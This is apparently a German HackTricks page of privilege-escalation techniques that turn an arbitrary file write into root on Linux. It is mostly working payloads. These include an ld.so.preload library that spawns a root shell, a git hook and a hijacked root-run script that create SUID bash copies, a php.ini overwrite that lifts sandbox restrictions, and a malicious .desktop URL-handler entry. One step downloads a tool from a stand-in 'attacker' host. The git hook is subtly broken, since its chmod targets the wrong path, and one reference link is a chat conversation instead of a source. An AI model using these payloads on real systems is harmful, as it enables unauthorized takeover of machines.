# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die Umgebungsvariable **`LD_PRELOAD`**, funktioniert aber auch bei **SUID binaries**.\
Wenn Sie sie erstellen oder ändern können, können Sie einfach einen **Pfad zu einer Bibliothek hinzufügen, die bei jedem ausgeführten binary geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository ausgeführt werden, wie z. B. wenn ein Commit erstellt wird, ein Merge... Wenn ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, in den **`.git`-Ordner** zu schreiben, kann dies für **privesc** genutzt werden.

Zum Beispiel ist es möglich, **ein Skript zu erzeugen** in einem Git-Repo in **`.git/hooks`**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Überschreiben einer restriktiven `php.ini`, die von einer privilegierten PHP sandbox verwendet wird

Einige benutzerdefinierte daemons validieren vom Benutzer geliefertes PHP, indem sie `php` mit einer **restricted `php.ini`** ausführen (z. B. `disable_functions=exec,system,...`). Wenn der sandboxed code weiterhin **any write primitive** (wie `file_put_contents`) hat und du den **exakten `php.ini`-Pfad** erreichen kannst, den der daemon verwendet, kannst du diese Konfiguration **überschreiben**, um die Beschränkungen aufzuheben, und anschließend eine zweite payload einsenden, die mit erhöhten Rechten ausgeführt wird.

Typischer Ablauf:

1. First payload überschreibt die Sandbox-Konfiguration.
2. Second payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root läuft (oder Pfade prüft, die root gehören), liefert die zweite Ausführung einen Root-Kontext. Dies ist im Wesentlichen **privilege escalation via config overwrite**, wenn die sandboxed runtime weiterhin Dateien schreiben kann.

### binfmt_misc

Die Datei unter `/proc/sys/fs/binfmt_misc` gibt an, welches Binary welchen Dateityp ausführen soll. TODO: prüfe die Voraussetzungen, um dies auszunutzen, um eine rev shell auszuführen, wenn ein gängiger Dateityp geöffnet ist.

### Überschreiben von Schema-Handlern (wie http: oder https:)

Ein Angreifer mit Schreibrechten auf die Konfigurationsverzeichnisse des Opfers kann Dateien leicht ersetzen oder erstellen, die das Systemverhalten ändern und zu unbeabsichtigter Codeausführung führen. Wenn `$HOME/.config/mimeapps.list` so verändert wird, dass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei zeigen (z. B. durch Setzen von `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **ein Klick auf beliebige http- oder https-Links den in dieser `evil.desktop`-Datei angegebenen Code auslöst**. Zum Beispiel, nachdem der folgende bösartige Code in `evil.desktop` in `$HOME/.local/share/applications` platziert wurde, führt jeder Klick auf eine externe URL den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Für mehr info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root: Ausführung benutzerschreibbarer Skripte/Binaries

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` (oder ein beliebiges Binary innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört) ausführt, kannst du es kapern:

- **Ausführung erkennen:** Prozesse mit [pspy](https://github.com/DominicBreuker/pspy) überwachen, um root zu erwischen, wenn es auf benutzerkontrollierte Pfade zugreift:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und schreibbar sind.
- **Hijack the target:** Sichere das originale binary/script und lege eine payload ab, die eine SUID shell (oder jede andere root-Aktion) erstellt, und stelle dann die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Löse die privilegierte Aktion aus** (z. B. das Drücken eines UI-Buttons, der den helper startet). Wenn root den hijacked path erneut ausführt, erhalte die escalated shell mit `./rootshell -p`.

## Referenzen

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
